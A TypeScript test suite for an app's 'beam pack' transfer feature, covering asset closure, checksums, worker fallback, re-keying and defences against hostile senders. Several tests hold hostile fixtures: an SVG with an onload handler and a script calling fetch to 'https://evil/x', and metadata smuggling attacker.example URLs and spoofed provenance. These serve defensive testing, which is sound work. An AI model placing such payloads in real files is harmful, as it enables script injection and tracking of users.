// SPDX-License-Identifier: MPL-2.0
/**
 * Beam packs - build and ingest (plan 100 section 6.4, section 11.15a, section 11.16, section 11.18, section 11.24).
 *
 * `collab/beam-protocol.test.ts` proves the wire. This suite proves the two ends that
 * touch the user's own data, against an in-memory host that behaves like the real
 * bridge (`data-transfer.ts`'s pattern), so every property the plan promises is
 * asserted rather than described:
 *
 *   - **closure**: a session's offer carries exactly the user-local assets it
 *     references - no more (an unreferenced upload never travels), no fewer (a ref
 *     buried in a `blocks` row does), and catalog refs are LISTED, never sent, with
 *     the `resolve: 'local'` marker that makes section 11.16's cross-profile honesty a
 *     property of the pack rather than a promise in the UI;
 *   - **checksums are the catalog's own**: a beam item's digest is byte-for-byte what
 *     `scripts/checksum-assets.ts` writes for the same bytes - cross-checked against
 *     that script's real `sriForFile`, because that equality is what makes
 *     receiver-side dedup a string compare;
 *   - **re-key + rewrite round trip**: assets land under receiver-local ids and the
 *     session that arrives after them opens pointing at those ids (section 11.18), with a
 *     ref the pack could not carry reported rather than silently lost;
 *   - **dedup**: identical bytes already here are reused - no second row, and the
 *     session's refs point at the row that was already there - but never onto a
 *     machine-owned row the user's library deliberately hides;
 *   - **byte-exactness**: what was staged is what is stored, bit for bit, so an
 *     embedded C2PA credential survives the trip (section 6.4);
 *   - **sessions never overwrite**: a received session is always a new slot;
 *   - **the manifest describes, it does not decide** (section 11.21/section 11.22): `type`/`format`/
 *     MIME are sniffed from the bytes, provenance is extracted from the bytes, markup
 *     is sanitised or refused, `meta` cannot smuggle Lolly's own bookkeeping keys or a
 *     remote URL onto a local row, and the row is named from the label the human was
 *     actually shown;
 *   - **no partial ingest** (section 11.18): a failed write undoes itself, and the whole beam
 *     can be rolled back;
 *   - **the worker is an optimisation, never a dependency**: a Worker constructor that
 *     throws - or one that never answers - produces the identical pack (section 11.15a's
 *     fallback).
 *
 * The last test drives a real `createBeamSender`/`createBeamReceiver` pair over a
 * synchronous loopback and ingests what lands, so the two halves are exercised
 * together rather than only against each other's fixtures.
 *
 * Run directly:  node --test shells/web/src/lib/beam-pack.test.ts
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import {
  BEAM_ID_PREFIX,
  BEAM_PACK_FORMAT,
  BeamPackError,
  MANIFEST_ITEM_ID,
  META_REJECTED_KEYS,
  STRINGS,
  buildBeamOffer,
  collectSessionAssetRefs,
  createBeamIngest,
  hashBlobs,
  ingestBeamItem,
  rewriteSessionAssetRefs,
  rollbackBeamIngest,
  sniffBeamAsset,
} from './beam-pack.ts';
import type {
  BeamAssetRecord,
  BeamPackAssetEntry,
  BeamPackHost,
  BeamPackRefEntry,
  BeamPackSessionEntry,
  BeamPackWorkerLike,
  BeamSessionRow,
} from './beam-pack.ts';
import { createBeamReceiver, createBeamSender, sriSha256 } from '../collab/beam-protocol.ts';
import type { BeamItem, BeamMessage, BeamSink, BeamWire } from '../collab/beam-protocol.ts';

// ── The in-memory host ────────────────────────────────────────────────────────

interface FakeHost extends BeamPackHost {
  records: Map<string, BeamAssetRecord>;
  sessions: Map<string, { data: Record<string, unknown>; thumb: string | null }>;
  uploads: number;
}

function makeHost(): FakeHost {
  const records = new Map<string, BeamAssetRecord>();
  const sessions = new Map<string, { data: Record<string, unknown>; thumb: string | null }>();
  const host: FakeHost = {
    records,
    sessions,
    uploads: 0,
    state: {
      async list(): Promise<readonly BeamSessionRow[]> {
        return [...sessions.entries()].map(([slot, row]) => ({
          slot,
          toolId: row.data.__toolId,
          toolVersion: row.data.__toolVersion,
          label: row.data.__label,
          thumb: row.thumb,
        }));
      },
      async load(slot) {
        const row = sessions.get(slot);
        return row ? JSON.parse(JSON.stringify(row.data)) : null;
      },
      async save(slot, data, thumb = null) {
        sessions.set(slot, { data: JSON.parse(JSON.stringify(data)), thumb: thumb ?? null });
      },
      async delete(slot) {
        sessions.delete(slot);
      },
    },
    assets: {
      async _exportUserAssets() {
        return [...records.values()];
      },
      async _uploadUserAsset(record) {
        host.uploads++;
        records.set(record.id, record);
      },
      async _getUserRecord(id) {
        return records.get(id) ?? null;
      },
      async _deleteUserAsset(id) {
        records.delete(id);
      },
    },
  };
  return host;
}

// ── Fixture bytes ─────────────────────────────────────────────────────────────
//
// The ingest side reads the BYTES to decide what a file is, so a fixture that claims
// `image/png` has to actually start like one. These build the smallest structures the
// real sniffers/extractors recognise - a PNG signature, a PNG chunk walk with a `caBX`
// (C2PA) chunk, an SVG - so the tests exercise `sniffFormat`/`extractC2paStore`
// themselves rather than a stand-in for them.

const PNG_SIG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];

/** Pseudo-random bytes wearing a real PNG signature. */
function pngOf(n: number, seed: number): Uint8Array {
  const out = bytesOf(n, seed);
  out.set(PNG_SIG, 0);
  return out;
}

/** A PNG whose chunk walk yields one `caBX` (C2PA manifest store) chunk holding
 *  `store`. Lengths are real; the CRCs are not read by the extractor. */
function pngWithCredential(store: Uint8Array): Uint8Array {
  const chunk = (type: string, data: Uint8Array): number[] => {
    const len = data.length;
    return [
      (len >>> 24) & 0xff, (len >>> 16) & 0xff, (len >>> 8) & 0xff, len & 0xff,
      ...[...type].map(c => c.charCodeAt(0)),
      ...data,
      0, 0, 0, 0,                                   // CRC - structural only
    ];
  };
  return new Uint8Array([
    ...PNG_SIG,
    ...chunk('IHDR', new Uint8Array(13)),
    ...chunk('caBX', store),
    ...chunk('IEND', new Uint8Array(0)),
  ]);
}

/** Deterministic pseudo-random bytes (xorshift32) - same seed, same pack, always. */
function bytesOf(n: number, seed: number): Uint8Array {
  const out = new Uint8Array(n);
  let x = (seed >>> 0) || 1;
  for (let i = 0; i < n; i++) {
    x ^= x << 13; x >>>= 0;
    x ^= x >> 17;
    x ^= x << 5;  x >>>= 0;
    out[i] = x & 0xff;
  }
  return out;
}

function addAsset(host: FakeHost, id: string, bytes: Uint8Array, extra: Partial<BeamAssetRecord> = {}): BeamAssetRecord {
  const record: BeamAssetRecord = {
    id,
    type: 'raster',
    format: 'png',
    blob: new Blob([bytes as unknown as BlobPart], { type: 'image/png' }),
    version: '1.0.0',
    meta: { name: id.split('/').pop() },
    ...extra,
  };
  host.records.set(id, record);
  return record;
}

const PHOTO = 'user/upload/1-photo.png';
const MAP = 'user/upload/2-map.png';
const GONE = 'user/upload/9-gone.png';
const LOGO = 'suse/logo/primary';

function ref(source: string, id: string, url = 'blob:sender/x'): Record<string, unknown> {
  return { source, id, type: 'raster', format: 'png', version: '1.0.0', url };
}

/** The fixture session: a catalog ref, two uploads (one of them only reachable through
 *  a `blocks` row), a treatment-modified repeat of one, a ref to an upload that has
 *  since been deleted, and a baked ref that carries its own bytes. */
function fixtureSession(): Record<string, unknown> {
  return {
    __toolId: 'design',
    __toolVersion: '1.0.0',
    __label: 'Berlin poster',
    logo: ref('library', LOGO),
    photo: ref('user', PHOTO),
    blocks: [
      { __rid: 'A', image: ref('user', MAP) },
      { __rid: 'B', image: ref('user', `${PHOTO}?treatment=warm`) },
    ],
    sticker: ref('user', GONE, ''),
    baked: { source: 'user', id: 'user/upload/3-baked.png', url: 'data:image/png;base64,AAAA', meta: { baked: true } },
    title: 'Hello',
  };
}

/** A host holding the fixture session and the two uploads that still exist. */
function senderHost(): FakeHost {
  const host = makeHost();
  addAsset(host, PHOTO, pngOf(3000, 11), {
    // The sender's row holds a SIDECAR credential (bytes that no longer carry it) and
    // a persisted AI flag. Neither travels - see the provenance tests below.
    credential: bytesOf(64, 99),
    credentialFormat: 'jpeg',
    aiGenerated: 'partial',
    width: 800,
    height: 600,
    meta: { name: 'photo.png', tags: ['event-berlin'] },
  });
  addAsset(host, MAP, pngOf(1500, 22), { meta: { name: 'map.png', tags: ['event-berlin', 'maps'] } });
  addAsset(host, 'user/upload/8-spare.png', pngOf(500, 33), { meta: { name: 'spare.png' } });
  host.sessions.set('design:1000', { data: fixtureSession(), thumb: 'data:image/png;base64,QQ==' });
  return host;
}

/** Hashing never touches a Worker in these tests unless a test asks for one. */
const NO_WORKER = { workerFactory: null } as const;

function assetEntries(entries: readonly unknown[]): BeamPackAssetEntry[] {
  return entries.filter((e): e is BeamPackAssetEntry => (e as BeamPackAssetEntry).kind === 'asset');
}

// ── Closure ───────────────────────────────────────────────────────────────────

test('the ref walk splits a session into what must travel and what must not', () => {
  const refs = collectSessionAssetRefs(fixtureSession());
  assert.deepEqual(refs.user, [PHOTO, MAP, GONE], 'uploads, first-seen, modifier collapsed to the base id');
  assert.deepEqual(refs.library, [LOGO], 'catalog refs are listed separately, never mixed in');
});

test('a baked ref is not in the closure - its bytes already ride in the session', () => {
  const refs = collectSessionAssetRefs({
    baked: { source: 'user', id: 'user/upload/x.png', url: 'data:image/png;base64,AAAA', meta: { baked: true } },
  });
  assert.deepEqual(refs.user, []);
});

test('a session offer carries exactly its user-local assets, in manifest → assets → session order', async () => {
  const host = senderHost();
  const built = await buildBeamOffer({ from: 'session', host, slot: 'design:1000', ...NO_WORKER });

  assert.equal(built.offer.kind, 'session');
  assert.equal(built.offer.name, 'Berlin poster');
  assert.equal(built.offer.items.length, 4, 'manifest + 2 uploads + the session');
  assert.equal(built.offer.items[0]!.id, MANIFEST_ITEM_ID, 'the manifest is always item 0');
  assert.equal(built.offer.items[0]!.label, STRINGS.manifestLabel);

  const kinds = built.manifest.entries.map(e => e.kind);
  assert.deepEqual(kinds, ['asset', 'asset', 'asset-ref', 'session'],
    'sessions come last so every asset they reference has been re-keyed by then');

  const assets = assetEntries(built.manifest.entries);
  assert.deepEqual(assets.map(a => a.sourceId), [PHOTO, MAP]);
  assert.ok(!assets.some(a => a.sourceId === 'user/upload/8-spare.png'), 'an unreferenced upload never travels');
  assert.ok(!assets.some(a => a.sourceId === GONE), 'a ref to a deleted upload cannot be sent, and is not fatal');

  const byRef = built.manifest.entries.find((e): e is BeamPackRefEntry => e.kind === 'asset-ref')!;
  assert.equal(byRef.sourceId, LOGO);
  assert.equal(byRef.resolve, 'local', 'the section 11.16 marker: the receiver resolves this from its own catalog');
  assert.deepEqual(built.byReference, [LOGO]);

  const session = built.manifest.entries.at(-1) as BeamPackSessionEntry;
  assert.equal(session.kind, 'session');
  assert.equal(session.toolId, 'design');
  assert.equal(session.thumb, 'data:image/png;base64,QQ==');
  assert.deepEqual(session.uses.user, [PHOTO, MAP]);
  assert.deepEqual(session.uses.library, [LOGO]);

  // Sizes are honest: the offer's declared bytes are the real payload lengths.
  assert.equal(built.offer.items[1]!.bytes, 3000);
  assert.equal(built.offer.items[2]!.bytes, 1500);
  assert.equal(built.totalBytes, built.offer.items.reduce((n, i) => n + i.bytes, 0));

  built.dispose();
});

test('the asset entry describes the file, and asserts nothing about its provenance', async () => {
  const host = senderHost();
  const built = await buildBeamOffer({ from: 'session', host, slot: 'design:1000', ...NO_WORKER });
  const photo = assetEntries(built.manifest.entries).find(a => a.sourceId === PHOTO)!;
  assert.equal(photo.mime, 'image/png');
  assert.equal(photo.width, 800);
  assert.equal(photo.height, 600);
  // The sender's row HAS a credential and an AI flag (senderHost sets both). Neither is
  // on the wire: a provenance claim beside the bytes is a peer telling the receiver's
  // device what to assert about a file, in either direction.
  const raw = photo as unknown as Record<string, unknown>;
  assert.equal(raw.credential, undefined, 'a beam carries no provenance claim…');
  assert.equal(raw.credentialFormat, undefined);
  assert.equal(raw.aiGenerated, undefined, '…including the AI-disclosure flag');
  assert.ok(!JSON.stringify(built.manifest).includes('aiGenerated'), 'and nothing else in the manifest smuggles one');
});

test('an asset selection and a tag pack read the same library through different doors', async () => {
  const host = senderHost();

  const picked = await buildBeamOffer({ from: 'assets', host, ids: [MAP, 'nope', 'user/upload/8-spare.png'], ...NO_WORKER });
  assert.equal(picked.offer.kind, 'assets');
  assert.deepEqual(assetEntries(picked.manifest.entries).map(a => a.sourceId), [MAP, 'user/upload/8-spare.png'],
    'selection order is kept and an id that has since vanished is skipped, not fatal');
  assert.equal(picked.offer.name, '2 files');

  const tagged = await buildBeamOffer({ from: 'tag', host, tag: 'Event-Berlin', ...NO_WORKER });
  assert.equal(tagged.offer.kind, 'tag-pack');
  assert.equal(tagged.offer.name, 'Everything tagged Event-Berlin');
  assert.deepEqual(assetEntries(tagged.manifest.entries).map(a => a.sourceId), [PHOTO, MAP], 'tag match is case-insensitive');

  const one = await buildBeamOffer({ from: 'assets', host, ids: [MAP], ...NO_WORKER });
  assert.equal(one.offer.name, STRINGS.filePackOne);
});

test('a source naming nothing sendable is a typed refusal, not an empty beam', async () => {
  const host = senderHost();
  await assert.rejects(
    () => buildBeamOffer({ from: 'tag', host, tag: 'no-such-tag', ...NO_WORKER }),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'empty',
  );
  await assert.rejects(
    () => buildBeamOffer({ from: 'session', host, slot: 'missing:1', ...NO_WORKER }),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'no-session',
  );
});

// ── Checksums ─────────────────────────────────────────────────────────────────

test('a beam item checksum is byte-for-byte the catalog convention', async () => {
  // The cross-check that matters: the digest the pack builder writes must equal the
  // one `scripts/checksum-assets.ts` writes for the same bytes, or receiver-side
  // dedup and the catalog's own integrity map stop speaking the same language.
  const { sriForFile } = await import('../../../../scripts/checksum-assets.ts');
  const path = fileURLToPath(new URL('../../../../package.json', import.meta.url));
  const bytes = new Uint8Array(readFileSync(path));

  const host = makeHost();
  addAsset(host, 'user/upload/pkg.json', bytes, { format: 'json', meta: { name: 'package.json' } });
  const built = await buildBeamOffer({ from: 'assets', host, ids: ['user/upload/pkg.json'], ...NO_WORKER });

  const fromScript = sriForFile(path)!;
  assert.equal(built.offer.items[1]!.checksum, fromScript.checksum);
  assert.equal(built.offer.items[1]!.bytes, fromScript.size);

  // …and the shape itself, independently of the script: `sha256-<base64 digest>`.
  const expected = `sha256-${createHash('sha256').update(bytes).digest('base64')}`;
  assert.equal(built.offer.items[1]!.checksum, expected);
  assert.match(built.offer.items[1]!.checksum, /^sha256-[A-Za-z0-9+/]{43}=$/);
});

test('the manifest item is checksummed over its own final bytes', async () => {
  const host = senderHost();
  const built = await buildBeamOffer({ from: 'session', host, slot: 'design:1000', ...NO_WORKER });
  const bytes = await built.source.read(0, 0, built.offer.items[0]!.bytes);
  assert.equal(bytes.length, built.offer.items[0]!.bytes);
  assert.equal(await sriSha256(bytes), built.offer.items[0]!.checksum);
  const manifest = JSON.parse(new TextDecoder().decode(bytes));
  assert.equal(manifest.format, BEAM_PACK_FORMAT);
  assert.equal(manifest.minReader, 1);
});

// ── The worker, and its absence ───────────────────────────────────────────────

/** A stand-in worker whose reply the test controls. */
function fakeWorker(reply: (blobs: Blob[]) => unknown, opts: { fail?: boolean } = {}): { worker: BeamPackWorkerLike; terminated: () => boolean } {
  let terminated = false;
  const worker: BeamPackWorkerLike = {
    onmessage: null,
    onerror: null,
    postMessage(message) {
      const { blobs } = message as { blobs: Blob[] };
      queueMicrotask(() => {
        if (opts.fail) worker.onerror?.({});
        else worker.onmessage?.({ data: reply(blobs) });
      });
    },
    terminate() { terminated = true; },
  };
  return { worker, terminated: () => terminated };
}

test('hashBlobs uses the worker when it answers, and always terminates it', async () => {
  const blobs = [new Blob(['a']), new Blob(['bb'])];
  const sentinel = ['sha256-' + 'A'.repeat(43) + '=', 'sha256-' + 'B'.repeat(43) + '='];
  const { worker, terminated } = fakeWorker(() => ({ id: 1, checksums: sentinel }));
  const out = await hashBlobs(blobs, { workerFactory: () => worker });
  assert.deepEqual(out, sentinel, 'the worker’s answer is used as-is - it is not recomputed here');
  assert.ok(terminated(), 'a build spins a worker up and lets it go again');
});

test('a Worker constructor that throws falls back to hashing in place', async () => {
  const bytes = bytesOf(2048, 7);
  const expected = await sriSha256(bytes);
  let constructed = 0;
  const out = await hashBlobs([new Blob([bytes as unknown as BlobPart])], {
    workerFactory: () => { constructed++; throw new Error('Worker is not defined'); },
  });
  assert.equal(constructed, 1);
  assert.deepEqual(out, [expected], 'the fallback produces the identical digest - same sriSha256 either way');
});

test('a worker that dies, or answers wrong, degrades to the fallback rather than the beam', async () => {
  const bytes = bytesOf(900, 5);
  const expected = [await sriSha256(bytes)];
  const blob = () => new Blob([bytes as unknown as BlobPart]);

  const dead = fakeWorker(() => ({}), { fail: true });
  assert.deepEqual(await hashBlobs([blob()], { workerFactory: () => dead.worker }), expected);
  assert.ok(dead.terminated());

  const liar = fakeWorker(() => ({ id: 1, checksums: ['nope', 'extra'] }));
  assert.deepEqual(await hashBlobs([blob()], { workerFactory: () => liar.worker }), expected);
});

test('a worker that never answers at all times out into the fallback', async () => {
  const bytes = bytesOf(700, 9);
  const silent: BeamPackWorkerLike = { onmessage: null, onerror: null, postMessage() { /* answers nothing, ever */ }, terminate() {} };
  // buildBeamOffer awaits this before it emits anything, so a wedged worker would
  // otherwise leave the sender with no offer, no error, and nothing to cancel.
  assert.deepEqual(
    await hashBlobs([new Blob([bytes as unknown as BlobPart])], { workerFactory: () => silent, timeoutMs: 5 }),
    [await sriSha256(bytes)],
  );
});

test('a build with no Worker available produces the identical pack', async () => {
  const withWorker = await buildBeamOffer({
    from: 'session', host: senderHost(), slot: 'design:1000',
    workerFactory: () => fakeWorker(async () => ({})).worker,   // never answers a usable reply
  });
  const without = await buildBeamOffer({ from: 'session', host: senderHost(), slot: 'design:1000', ...NO_WORKER });
  assert.deepEqual(
    withWorker.offer.items.map(i => i.checksum),
    without.offer.items.map(i => i.checksum),
    'section 11.15a’s worker is an optimisation; the pack it produces is the same pack',
  );
});

// ── Ingest ────────────────────────────────────────────────────────────────────

/** Read one built item's whole payload back out of the byte source. */
async function payloadOf(built: Awaited<ReturnType<typeof buildBeamOffer>>, index: number): Promise<Blob> {
  const item = built.offer.items[index]!;
  const bytes = await built.source.read(index, 0, item.bytes);
  return new Blob([bytes as unknown as BlobPart]);
}

/** Deliver a whole built pack into a receiving host, item by item, in order. */
async function deliver(
  built: Awaited<ReturnType<typeof buildBeamOffer>>,
  to: FakeHost,
  fromName = 'Priya',
): Promise<{ ctx: ReturnType<typeof createBeamIngest>; results: Awaited<ReturnType<typeof ingestBeamItem>>[] }> {
  const ctx = createBeamIngest(to, { fromName });
  const results = [];
  for (let i = 0; i < built.offer.items.length; i++) {
    results.push(await ingestBeamItem(built.offer.items[i]!, await payloadOf(built, i), ctx));
  }
  return { ctx, results };
}

/** An ingest primed with a hand-written manifest - the hostile-sender harness. The
 *  manifest goes in through the real item-0 path, so nothing here bypasses parsing. */
async function manifestOnly(
  to: FakeHost,
  entries: readonly unknown[],
  opts: Parameters<typeof createBeamIngest>[1] = {},
): Promise<ReturnType<typeof createBeamIngest>> {
  const ctx = createBeamIngest(to, { fromName: 'Priya', ...opts });
  const bytes = new TextEncoder().encode(JSON.stringify({
    format: BEAM_PACK_FORMAT, formatVersion: 1, minReader: 1, kind: 'assets', name: 'pack', entries,
  }));
  await ingestBeamItem(
    { id: MANIFEST_ITEM_ID, label: STRINGS.manifestLabel, bytes: bytes.length, checksum: await sriSha256(bytes) },
    new Blob([bytes as unknown as BlobPart]),
    ctx,
  );
  return ctx;
}

test('assets land re-keyed and the session that follows opens pointing at them', async () => {
  const from = senderHost();
  const to = makeHost();
  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });
  const { ctx, results } = await deliver(built, to);

  assert.equal(results[0]!.kind, 'manifest');
  const photoResult = results[1]! as { kind: 'asset'; id: string; deduped: boolean };
  const mapResult = results[2]! as { kind: 'asset'; id: string; deduped: boolean };
  assert.equal(photoResult.kind, 'asset');
  assert.ok(photoResult.id.startsWith(BEAM_ID_PREFIX), 'a received upload gets a receiver-local id (section 11.18)');
  assert.notEqual(photoResult.id, PHOTO, 'the sender’s id is never reused as an address');
  assert.equal(ctx.rekey.get(PHOTO), photoResult.id);

  const session = results[3]! as { kind: 'session'; slot: string; label: string; rewritten: number; unresolved: readonly string[] };
  assert.equal(session.kind, 'session');
  assert.equal(session.label, 'Berlin poster (from Priya)');
  assert.equal(session.rewritten, 3, 'the photo, the blocks map, and the treatment-modified repeat');
  assert.deepEqual(session.unresolved, [GONE], 'a ref the pack could not carry is reported, never silently dropped');

  const saved = to.sessions.get(session.slot)!.data;
  assert.equal((saved.photo as { id: string }).id, photoResult.id);
  assert.equal((saved.photo as { url: string }).url, '', 'a sender’s blob: URL is meaningless here - the id re-resolves');
  const blocks = saved.blocks as { image: { id: string } }[];
  assert.equal(blocks[0]!.image.id, mapResult.id);
  assert.equal(blocks[1]!.image.id, `${photoResult.id}?treatment=warm`, 'a modifier suffix rides along the re-key');
  assert.equal((saved.sticker as { id: string }).id, GONE, 'an unresolvable ref is left alone to render its broken-ref affordance');
  assert.equal((saved.logo as { id: string }).id, LOGO, 'a catalog ref is never rewritten - the receiver resolves it locally');
  assert.equal((saved.baked as { url: string }).url, 'data:image/png;base64,AAAA', 'a baked ref is untouched');
  assert.equal(to.sessions.get(session.slot)!.thumb, 'data:image/png;base64,QQ==');
});

test('a received asset is stored byte-exact, typed from its bytes, with attribution', async () => {
  const from = senderHost();
  const to = makeHost();
  const built = await buildBeamOffer({ from: 'session', host: from, slot: 'design:1000', ...NO_WORKER });
  const { results } = await deliver(built, to);

  const photoId = (results[1]! as { id: string }).id;
  const stored = to.records.get(photoId)!;
  const inBytes = new Uint8Array(await from.records.get(PHOTO)!.blob!.arrayBuffer());
  const outBytes = new Uint8Array(await stored.blob!.arrayBuffer());
  assert.deepEqual([...outBytes], [...inBytes], 'in === out: no re-encode, no re-wrap, nothing stripped');
  assert.equal(stored.checksum, built.offer.items[1]!.checksum, 'the verified digest is kept, so a later dedup is a string compare');
  assert.equal(stored.type, 'raster', 'read out of the bytes, not out of the manifest');
  assert.equal(stored.format, 'png');
  assert.equal(stored.blob!.type, 'image/png');
  assert.equal(stored.width, 800);
  assert.equal(stored.meta!.beamFrom, 'Priya');
  assert.equal(stored.meta!.beamNote, 'From Priya');
  assert.equal(stored.meta!.beamSourceId, PHOTO);
  assert.deepEqual(stored.meta!.tags, ['event-berlin'], 'the sender’s own metadata rides along');
});

// ── The manifest describes; the bytes decide (section 11.21, section 11.22) ─────────────────

test('type, format and MIME are sniffed from the bytes, never taken from the manifest', async () => {
  // The exact shape lib/tts-provenance.ts re-arms the on-device speech-credential heal
  // on: `type: 'audio'`, `format: 'wav'`, and a `meta.tts` recipe. If any of the three
  // survived a beam, the receiver's own enrolled identity would sign the SENDER's bytes
  // as its own AI synthesis - and rewrite the received bytes doing it.
  const to = makeHost();
  const payload = pngOf(256, 41);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.wav', label: 'clip.wav',
    bytes: payload.length, checksum: 'ignored',
    type: 'audio', format: 'wav', mime: 'text/html',
    meta: { name: 'clip.wav', tts: { text: 'read this in my voice', voice: 'af_heart' }, keep: 'yes' },
  }]);

  const result = await ingestBeamItem(
    { id: '1/x', label: 'clip.wav', bytes: payload.length, checksum: await sriSha256(payload) },
    new Blob([payload as unknown as BlobPart]),
    ctx,
  ) as { kind: 'asset'; id: string };
  const stored = to.records.get(result.id)!;

  assert.equal(stored.type, 'raster', 'the bytes are a PNG whatever the manifest calls them');
  assert.equal(stored.format, 'png');
  assert.equal(stored.blob!.type, 'image/png', 'and the peer never chooses the stored MIME');
  assert.equal(Object.hasOwn(stored.meta!, 'tts'), false, 'the TTS recipe never lands on a local row');
  assert.equal(stored.meta!.keep, 'yes', 'ordinary metadata is untouched by the filter');
});

test('an unrecognised container gets a whitelisted label and an opaque MIME', () => {
  const junk = bytesOf(64, 77);
  junk[0] = 0x2a;                                   // nothing any sniffer knows

  const asVector = sniffBeamAsset(junk, { type: 'vector', format: 'svg' });
  assert.equal(asVector.type, 'data', 'vector is never reachable without bytes that ARE an SVG…');
  assert.equal(asVector.mime, 'application/octet-stream', '…and an unknown blob is never a document in this origin');
  assert.equal(asVector.sniffed, false);
  assert.equal(asVector.markup, false);

  const asAudio = sniffBeamAsset(junk, { type: 'audio', format: 'w a v/../x' });
  assert.equal(asAudio.type, 'audio', 'a whitelisted label still survives as a label');
  assert.equal(asAudio.format, 'wavx', 'sanitised to something an id tail can carry');

  const svg = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>');
  assert.deepEqual(
    { type: sniffBeamAsset(svg).type, markup: sniffBeamAsset(svg).markup },
    { type: 'vector', markup: true },
    'markup is recognised from the bytes and flagged for sanitisation',
  );
});

test('markup is sanitised before it is stored, and refused when it cannot be', async () => {
  const hostile = new TextEncoder().encode(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="steal()"><script>fetch("https://evil/x")</script><rect width="4" height="4"/></svg>',
  );
  const entry = {
    kind: 'asset' as const, itemId: '1/x', sourceId: 'user/upload/art.svg', label: 'art.svg',
    bytes: hostile.length, checksum: 'ignored', type: 'vector', format: 'svg', mime: 'image/svg+xml',
  };
  const item = { id: '1/x', label: 'art.svg', bytes: hostile.length, checksum: await sriSha256(hostile) };

  // 1. No sanitiser on this runtime → the item is refused. It does NOT fall through to
  //    storing the bytes, which is the whole invariant ("script bytes never reach disk").
  const bare = makeHost();
  const bareCtx = await manifestOnly(bare, [entry]);
  await assert.rejects(
    () => ingestBeamItem(item, new Blob([hostile as unknown as BlobPart]), bareCtx),
    (err: BeamPackError) => err instanceof BeamPackError && err.code === 'unsafe-item',
  );
  assert.equal(bare.records.size, 0, 'nothing was written on the way to refusing it');

  // 2. With a sanitiser, the SANITISED bytes are what land - digest, dedup and the
  //    stored blob all agree on them, and the executable markup is gone.
  const to = makeHost();
  const ctx = await manifestOnly(to, [entry], {
    sanitizeSvg: (bytes) => new TextEncoder().encode(
      new TextDecoder().decode(bytes).replace(/<script>.*?<\/script>/g, '').replace(/ onload="[^"]*"/g, ''),
    ),
  });
  const result = await ingestBeamItem(item, new Blob([hostile as unknown as BlobPart]), ctx) as { kind: 'asset'; id: string };
  const stored = to.records.get(result.id)!;
  const text = await stored.blob!.text();
  assert.ok(!text.includes('<script'), 'no script survived to disk');
  assert.ok(!text.includes('onload'), 'nor an inline handler');
  assert.ok(text.includes('<rect'), 'the drawable markup did');
  assert.equal(stored.blob!.type, 'image/svg+xml');
  assert.equal(stored.checksum, await sriSha256(new Uint8Array(await stored.blob!.arrayBuffer())),
    'the stored digest is over the stored bytes - the one place a beam is deliberately not byte-exact');
});

test('provenance is read out of the received bytes, never off the manifest', async () => {
  const store = bytesOf(48, 91);
  const credentialed = pngWithCredential(store);
  const to = makeHost();
  const ctx = await manifestOnly(to, [
    {
      kind: 'asset', itemId: '1/real', sourceId: 'user/upload/a.png', label: 'a.png',
      bytes: credentialed.length, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
      // A peer asserting the opposite of what the bytes say, in both directions.
      credential: 'AAAA', credentialFormat: 'jpeg', aiGenerated: 'full',
    },
    {
      kind: 'asset', itemId: '2/plain', sourceId: 'user/upload/b.png', label: 'b.png',
      bytes: 300, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
      credential: 'AAAA', credentialFormat: 'jpeg', aiGenerated: 'full',
    },
  ] as unknown as BeamPackAssetEntry[]);

  const real = await ingestBeamItem(
    { id: '1/real', label: 'a.png', bytes: credentialed.length, checksum: await sriSha256(credentialed) },
    new Blob([credentialed as unknown as BlobPart]), ctx,
  ) as { kind: 'asset'; id: string };
  const withCred = to.records.get(real.id)!;
  assert.deepEqual([...withCred.credential!], [...store], 'the store that is really in the file is the store that is kept');
  assert.equal(withCred.credentialFormat, 'png', 'and its format is the sniffed container, not the claimed one');
  assert.equal(withCred.aiGenerated, undefined,
    'the AI flag is never carried - the assets bridge derives it from this store with the real verifier');

  const plainBytes = pngOf(300, 12);
  const plain = await ingestBeamItem(
    { id: '2/plain', label: 'b.png', bytes: plainBytes.length, checksum: await sriSha256(plainBytes) },
    new Blob([plainBytes as unknown as BlobPart]), ctx,
  ) as { kind: 'asset'; id: string };
  const noCred = to.records.get(plain.id)!;
  assert.equal(noCred.credential, undefined, 'a file with nothing signed gets nothing asserted onto it');
  assert.equal(noCred.aiGenerated, undefined);
});

test('meta cannot smuggle Lolly’s own keys, or an outbound URL, onto a local row', async () => {
  const to = makeHost();
  const payload = pngOf(128, 55);
  const ctx = await manifestOnly(to, [{
    kind: 'asset', itemId: '1/x', sourceId: 'user/upload/x.png', label: 'x.png',
    bytes: payload.length, checksum: 'x', type: 'raster', format: 'png', mime: 'image/png',
    meta: {
      name: 'ignored - the row is named from the label',
      thumbUrl: 'https://attacker.example/px.gif?u=1',   // views/catalog.ts paints this into <img src>
      posterUrl: '//attacker.example/p.gif',
      beamFrom: 'Someone Trustworthy',                    // this ingest's own attribution
      baked: true,
      nested: { src: 'https://attacker.example/n.gif', keep: 'yes' },
      list: ['https://attacker.example/l.gif', 'fine'],
      tags: ['event-berlin'],
    },
  }]);

  const result = await ingestBeamItem(
    { id: '1/x', label: 'x.png', bytes: payload.length, checksum: await sriSha256(payload) },
    new Blob([payload as unknown as BlobPart]), ctx,
  ) as { kind: 'asset'; id: string };
  const meta = to.records.get(result.id)!.meta!;

  for (const key of ['thumbUrl', 'posterUrl', 'baked']) {
    assert.equal(Object.hasOwn(meta, key), false, `${key} never lands`);
  }
  assert.equal(meta.beamFrom, 'Priya', 'attribution is this device’s, not the peer’s');
  assert.equal((meta.nested as Record<string, unknown>).src, undefined, 'a remote URL is dropped at any depth');
  assert.equal((meta.nested as Record<string, unknown>).keep, 'yes', 'its siblings are not');
  assert.deepEqual(meta.list, ['fine'], 'and inside arrays too');
  assert.deepEqual(meta.tags, ['event-berlin']);
